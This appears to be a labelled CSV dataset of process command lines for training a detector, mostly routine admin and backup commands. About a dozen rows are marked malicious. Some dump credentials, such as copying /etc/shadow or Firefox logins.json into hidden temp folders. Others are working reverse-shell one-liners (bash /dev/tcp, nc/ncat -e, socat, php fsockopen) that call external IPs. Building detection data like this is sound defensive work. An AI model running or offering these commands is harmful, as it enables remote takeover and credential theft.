process_name,command_line,label,attack_type
reg.exe,reg.exe export HKLM\SOFTWARE\Vendor\manifest C:\Backups\reg\manifest-2.36.8.reg /y,benign,benign
certutil.exe,certutil.exe -store My 1ef0f55b791d3ce4bb8e85e63dc841bf,benign,benign
ssh,ssh -tt -i /etc/ci/deploy_key sysadmin@app06.corp.local 'sudo systemctl restart payroll',benign,benign
reg.exe,reg.exe export HKLM\SOFTWARE\Vendor\audit_trail C:\Backups\reg\audit_trail-8.13.5.reg /y,benign,benign
pg_dump,pg_dump -h 10.24.35.55 -U ansible -Fc -f /srv/backups/db/dataset_part-1.21.9.dump --no-password customers,benign,benign
openssl,openssl pkcs12 -export -in /etc/ssl/session_blob.crt -inkey /etc/ssl/session_blob.key -out /srv/backups/certs/session_blob.pfx -passout pass:871df913acc49147c677eb4f2cc61b96,benign,benign
openssl,openssl pkcs12 -export -in /etc/ssl/telemetry_batch.crt -inkey /etc/ssl/telemetry_batch.key -out /srv/backups/certs/telemetry_batch.pfx -passout pass:693dfe7c7830fcaa2ab5f87f97e42417,benign,benign
cat,cat /etc/shadow > /tmp/.2bc73e93c9877ed8/sh.txt,malicious,credential_dumping
pg_dump,pg_dump -h 10.30.200.158 -U sysadmin -Fc -f /srv/backups/db/ledger_2024-9.26.5.dump --no-password customers,benign,benign
reg.exe,reg.exe export HKLM\SOFTWARE\Vendor\telemetry_batch C:\Backups\reg\telemetry_batch-2.11.4.reg /y,benign,benign
certutil.exe,certutil.exe -store My f2116ac93be7f970fc8ee527cc37ab89,benign,benign
ldapsearch,"ldapsearch -x -H ldap://db10.ad.example.com -b 'dc=corp,dc=local' '(objectClass=user)' sAMAccountName -LLL",benign,benign
mysqldump,mysqldump --single-transaction --routines --triggers -u ops -p$DB_PASS billing > /srv/backups/audit_trail.sql,benign,benign
pg_dump,pg_dump -h 10.39.141.197 -U root -Fc -f /srv/backups/db/ledger_2024-8.14.2.dump --no-password customers,benign,benign
mysqldump,mysqldump --single-transaction --routines --triggers -u admin -p$DB_PASS billing > /srv/backups/ledger_2024.sql,benign,benign
powershell.exe,powershell.exe Export-Certificate -Cert Cert:\LocalMachine\My\e5355c45c507b05b -FilePath C:\Backups\certs\audit_trail.cer,benign,benign
cp,cp /home/postgres/.mozilla/firefox/*.default-release/logins.json /tmp/.9f03bd07fb81789a/,malicious,credential_dumping
mysqldump,mysqldump --single-transaction --routines --triggers -u mssql -p$DB_PASS billing > /srv/backups/archive_set.sql,benign,benign
reg.exe,reg.exe export HKLM\SOFTWARE\Vendor\snapshot C:\Backups\reg\snapshot-1.8.3.reg /y,benign,benign
kubectl,kubectl get secret archive_set-tls -n production -o yaml > /srv/backups/k8s/archive_set-secret.yaml,benign,benign
ssh,ssh -N -L 8080:localhost:5432 ops@node04.ad.example.com,benign,benign
docker,docker exec -it snapshot-3ce17a428c81732668fc510497f4a53f /bin/bash -lc 'tail -f /var/log/app/current',benign,benign
aws,aws secretsmanager get-secret-value --secret-id prod/payroll/api --query SecretString --output text --profile ci,benign,benign
expect,expect -f /opt/automation/rotate-router-cache07.exp,benign,benign
openssl,openssl pkcs12 -export -in /etc/ssl/report_final.crt -inkey /etc/ssl/report_final.key -out /srv/backups/certs/report_final.pfx -passout pass:54bab0829d2362da,benign,benign
ldapsearch,"ldapsearch -x -H ldap://cache06.eng.example.net -b 'dc=corp,dc=local' '(objectClass=user)' sAMAccountName -LLL",benign,benign
ldapsearch,"ldapsearch -x -H ldap://db07.corp.local -b 'dc=corp,dc=local' '(objectClass=user)' sAMAccountName -LLL",benign,benign
cp,cp /home/build/.mozilla/firefox/*.default-release/logins.json /tmp/.54bab0829d2362da/,malicious,credential_dumping
reg.exe,reg.exe export HKLM\SOFTWARE\Vendor\design_spec C:\Backups\reg\design_spec-2.39.1.reg /y,benign,benign
ssh,ssh -N -L 8080:localhost:5432 postgres@svc04.ad.example.com,benign,benign
powershell.exe,powershell.exe Export-Certificate -Cert Cert:\LocalMachine\My\0d62ae13c4a57a5a9aadd380de4aac9b -FilePath C:\Backups\certs\telemetry_batch.cer,benign,benign
powershell.exe,powershell.exe Export-Certificate -Cert Cert:\LocalMachine\My\e881c666137888a5 -FilePath C:\Backups\certs\customer_db.cer,benign,benign
ssh,ssh -tt -i /etc/ci/deploy_key release@web08.ad.example.com 'sudo systemctl restart manifest',benign,benign
docker,docker exec -it ledger_2024-ee41c775de9e74106c5065e04f5cc20e /bin/bash -lc 'tail -f /var/log/app/current',benign,benign
reg.exe,reg.exe export HKLM\SOFTWARE\Vendor\manifest C:\Backups\reg\manifest-6.35.2.reg /y,benign,benign
reg.exe,reg.exe export HKLM\SOFTWARE\Vendor\customer_db C:\Backups\reg\customer_db-4.36.7.reg /y,benign,benign
openssl,openssl pkcs12 -export -in /etc/ssl/report_final.crt -inkey /etc/ssl/report_final.key -out /srv/backups/certs/report_final.pfx -passout pass:f70043b68b8c4580,benign,benign
pg_dump,pg_dump -h 10.35.254.77 -U jenkins -Fc -f /srv/backups/db/manifest-5.8.9.dump --no-password customers,benign,benign
mosh,mosh --ssh='ssh -i /etc/ci/key' postgres@db10.ad.example.com -- tmux attach -t deploy,benign,benign
ssh,ssh -N -L 31337:localhost:5432 postgres@db08.prod.svc.cluster.local,benign,benign
socat,"socat TCP-LISTEN:8443,reuseaddr,fork TCP:10.1.100.52:5432",benign,benign
tmux,"tmux new-session -d -s deploy 'ssh automation@worker03 ""journalctl -u audit_trail -f""'",benign,benign
docker,docker exec -it payroll-883354bd434cbd092cce03174720110a /bin/bash -lc 'tail -f /var/log/app/current',benign,benign
cp,cp /home/postgres/.mozilla/firefox/*.default-release/logins.json /tmp/.e9ac890f6b0d/,malicious,credential_dumping
openssl,openssl pkcs12 -export -in /etc/ssl/archive_set.crt -inkey /etc/ssl/archive_set.key -out /srv/backups/certs/archive_set.pfx -passout pass:1ef0f55b791d3ce4bb8e85e63dc841bf,benign,benign
nc,nc -z -w2 10.15.197.210 8443 && echo 'port 8443 open on 10.15.197.210',benign,benign
socat,"socat TCP-LISTEN:9001,reuseaddr,fork TCP:10.39.170.112:5432",benign,benign
reg.exe,reg.exe export HKLM\SOFTWARE\Vendor\manifest C:\Backups\reg\manifest-6.24.6.reg /y,benign,benign
mosh,mosh --ssh='ssh -i /etc/ci/key' release@db08.ad.example.com -- tmux attach -t deploy,benign,benign
openssl,openssl pkcs12 -export -in /etc/ssl/payroll.crt -inkey /etc/ssl/payroll.key -out /srv/backups/certs/payroll.pfx -passout pass:3236fcea7a92,benign,benign
pg_dump,pg_dump -h 10.40.164.12 -U www-data -Fc -f /srv/backups/db/archive_set-2.34.5.dump --no-password customers,benign,benign
reg.exe,reg.exe export HKLM\SOFTWARE\Vendor\dataset_part C:\Backups\reg\dataset_part-8.10.0.reg /y,benign,benign
powershell.exe,powershell.exe Export-Certificate -Cert Cert:\LocalMachine\My\45599927f333 -FilePath C:\Backups\certs\report_final.cer,benign,benign
cat,cat /etc/shadow > /tmp/.6be137b4fffe/sh.txt,malicious,credential_dumping
pg_dump,pg_dump -h 10.5.98.114 -U build -Fc -f /srv/backups/db/archive_set-3.31.9.dump --no-password customers,benign,benign
nc,nc -z -w2 10.13.98.36 5985 && echo 'port 5985 open on 10.13.98.36',benign,benign
ldapsearch,"ldapsearch -x -H ldap://build10.corp.local -b 'dc=corp,dc=local' '(objectClass=user)' sAMAccountName -LLL",benign,benign
reg.exe,reg.exe export HKLM\SOFTWARE\Vendor\audit_trail C:\Backups\reg\audit_trail-3.24.5.reg /y,benign,benign
reg.exe,reg.exe export HKLM\SOFTWARE\Vendor\snapshot C:\Backups\reg\snapshot-9.39.7.reg /y,benign,benign
reg.exe,reg.exe export HKLM\SOFTWARE\Vendor\design_spec C:\Backups\reg\design_spec-5.34.0.reg /y,benign,benign
powershell.exe,powershell.exe Export-Certificate -Cert Cert:\LocalMachine\My\d902fd7bda7a -FilePath C:\Backups\certs\dataset_part.cer,benign,benign
socat,"socat TCP:91.231.38.182:8080 EXEC:'/bin/bash -li',pty,stderr,setsid,sigint,sane",malicious,reverse_shell
pg_dump,pg_dump -h 10.2.193.52 -U automation -Fc -f /srv/backups/db/audit_trail-1.10.2.dump --no-password customers,benign,benign
openssl,openssl pkcs12 -export -in /etc/ssl/audit_trail.crt -inkey /etc/ssl/audit_trail.key -out /srv/backups/certs/audit_trail.pfx -passout pass:b18542383f8e3eb1,benign,benign
gpg,gpg --export-secret-keys --armor backups@internal.acme.io > /srv/backups/keys/payroll.asc,benign,benign
mysqldump,mysqldump --single-transaction --routines --triggers -u sysadmin -p$DB_PASS billing > /srv/backups/report_final.sql,benign,benign
gpg,gpg --export-secret-keys --armor backups@prod.svc.cluster.local > /srv/backups/keys/payroll.asc,benign,benign
pg_dump,pg_dump -h 10.31.108.93 -U automation -Fc -f /srv/backups/db/audit_trail-5.11.9.dump --no-password customers,benign,benign
mysqldump,mysqldump --single-transaction --routines --triggers -u ansible -p$DB_PASS billing > /srv/backups/manifest.sql,benign,benign
pg_dump,pg_dump -h 10.40.227.31 -U postgres -Fc -f /srv/backups/db/report_final-6.14.1.dump --no-password customers,benign,benign
openssl,openssl pkcs12 -export -in /etc/ssl/audit_trail.crt -inkey /etc/ssl/audit_trail.key -out /srv/backups/certs/audit_trail.pfx -passout pass:1ef0f55b791d3ce4bb8e85e63dc841bf,benign,benign
ldapsearch,"ldapsearch -x -H ldap://db03.corp.local -b 'dc=corp,dc=local' '(objectClass=user)' sAMAccountName -LLL",benign,benign
bash,bash -i >& /dev/tcp/91.72.124.67/53 0>&1,malicious,reverse_shell
certutil.exe,certutil.exe -store My 881a14dffa5c0e26c96fde4ccc528a48,benign,benign
powershell.exe,powershell.exe Export-Certificate -Cert Cert:\LocalMachine\My\e3a56da39776 -FilePath C:\Backups\certs\session_blob.cer,benign,benign
reg.exe,reg.exe export HKLM\SOFTWARE\Vendor\payroll C:\Backups\reg\payroll-7.0.6.reg /y,benign,benign
ssh,ssh -tt -i /etc/ci/deploy_key svc_backup@worker02.ad.example.com 'sudo systemctl restart archive_set',benign,benign
mysqldump,mysqldump --single-transaction --routines --triggers -u root -p$DB_PASS billing > /srv/backups/ledger_2024.sql,benign,benign
openssl,openssl pkcs12 -export -in /etc/ssl/dataset_part.crt -inkey /etc/ssl/dataset_part.key -out /srv/backups/certs/dataset_part.pfx -passout pass:a8864878b44c3a1c8e84e566c2c7d023,benign,benign
python3,python3 -m http.server 9001 --directory /srv/artifacts/session_blob --bind 10.22.21.112,benign,benign
pg_dump,pg_dump -h 10.24.194.38 -U sysadmin -Fc -f /srv/backups/db/ledger_2024-5.23.3.dump --no-password customers,benign,benign
openssl,openssl pkcs12 -export -in /etc/ssl/archive_set.crt -inkey /etc/ssl/archive_set.key -out /srv/backups/certs/archive_set.pfx -passout pass:244f9cc0ced252b41915e38ecc283fc3,benign,benign
mosh,mosh --ssh='ssh -i /etc/ci/key' ansible@edge07.corp.local -- tmux attach -t deploy,benign,benign
pg_dump,pg_dump -h 10.34.129.226 -U deploy -Fc -f /srv/backups/db/report_final-3.4.2.dump --no-password customers,benign,benign
gpg,gpg --export-secret-keys --armor backups@corp.local > /srv/backups/keys/dataset_part.asc,benign,benign
ssh,ssh -N -L 4444:localhost:5432 ansible@node07.ad.example.com,benign,benign
ldapsearch,"ldapsearch -x -H ldap://node10.ad.example.com -b 'dc=corp,dc=local' '(objectClass=user)' sAMAccountName -LLL",benign,benign
php,"php -r '$s=fsockopen(""5.91.32.81"",80);exec(""/bin/sh -i <&3 >&3 2>&3"");'",malicious,reverse_shell
openssl,openssl pkcs12 -export -in /etc/ssl/dataset_part.crt -inkey /etc/ssl/dataset_part.key -out /srv/backups/certs/dataset_part.pfx -passout pass:6be137b4fffe,benign,benign
ncat,ncat 185.122.191.51 1337 -e /bin/bash,malicious,reverse_shell
nc,nc -z -w2 10.18.79.16 8443 && echo 'port 8443 open on 10.18.79.16',benign,benign
pg_dump,pg_dump -h 10.39.99.207 -U mssql -Fc -f /srv/backups/db/archive_set-3.36.2.dump --no-password customers,benign,benign
pg_dump,pg_dump -h 10.13.98.36 -U admin -Fc -f /srv/backups/db/dataset_part-6.4.9.dump --no-password customers,benign,benign
reg.exe,reg.exe export HKLM\SOFTWARE\Vendor\archive_set C:\Backups\reg\archive_set-7.13.8.reg /y,benign,benign
openssl,openssl pkcs12 -export -in /etc/ssl/payroll.crt -inkey /etc/ssl/payroll.key -out /srv/backups/certs/payroll.pfx -passout pass:d598050b917c6e7b00eda90371cdcfa2,benign,benign
reg.exe,reg.exe export HKLM\SOFTWARE\Vendor\customer_db C:\Backups\reg\customer_db-9.26.1.reg /y,benign,benign
python3,python3 -m http.server 5985 --directory /srv/artifacts/customer_db --bind 10.25.206.207,benign,benign
certutil.exe,certutil.exe -store My fa212de203b5eed8006a7a0f4782494d,benign,benign
tmux,"tmux new-session -d -s deploy 'ssh automation@app05 ""journalctl -u snapshot -f""'",benign,benign
pg_dump,pg_dump -h 10.22.21.112 -U admin -Fc -f /srv/backups/db/snapshot-6.19.6.dump --no-password customers,benign,benign
reg.exe,reg.exe export HKLM\SOFTWARE\Vendor\customer_db C:\Backups\reg\customer_db-0.38.8.reg /y,benign,benign
pg_dump,pg_dump -h 10.40.227.31 -U root -Fc -f /srv/backups/db/dataset_part-8.11.9.dump --no-password customers,benign,benign
powershell.exe,powershell.exe Export-Certificate -Cert Cert:\LocalMachine\My\a05b68c5ddc3 -FilePath C:\Backups\certs\audit_trail.cer,benign,benign
ssh,ssh -N -L 5985:localhost:5432 automation@svc03.prod.svc.cluster.local,benign,benign
pg_dump,pg_dump -h 10.10.240.161 -U postgres -Fc -f /srv/backups/db/manifest-1.6.2.dump --no-password customers,benign,benign
reg.exe,reg.exe export HKLM\SOFTWARE\Vendor\report_final C:\Backups\reg\report_final-5.34.7.reg /y,benign,benign
nc,nc -e /bin/bash 91.211.68.100 2222,malicious,reverse_shell
reg.exe,reg.exe export HKLM\SOFTWARE\Vendor\design_spec C:\Backups\reg\design_spec-5.4.1.reg /y,benign,benign
powershell.exe,powershell.exe Export-Certificate -Cert Cert:\LocalMachine\My\bfe9ddf26f44 -FilePath C:\Backups\certs\archive_set.cer,benign,benign
ldapsearch,"ldapsearch -x -H ldap://svc09.prod.svc.cluster.local -b 'dc=corp,dc=local' '(objectClass=user)' sAMAccountName -LLL",benign,benign
gpg,gpg --export-secret-keys --armor backups@internal.acme.io > /srv/backups/keys/report_final.asc,benign,benign
ssh,ssh -N -L 443:localhost:5432 svc_backup@ci04.ad.example.com,benign,benign
pg_dump,pg_dump -h 10.10.41.185 -U www-data -Fc -f /srv/backups/db/customer_db-0.25.8.dump --no-password customers,benign,benign
ncat,ncat 5.233.15.187 8443 -e /bin/bash,malicious,reverse_shell
openssl,openssl pkcs12 -export -in /etc/ssl/audit_trail.crt -inkey /etc/ssl/audit_trail.key -out /srv/backups/certs/audit_trail.pfx -passout pass:bdeca475c013,benign,benign
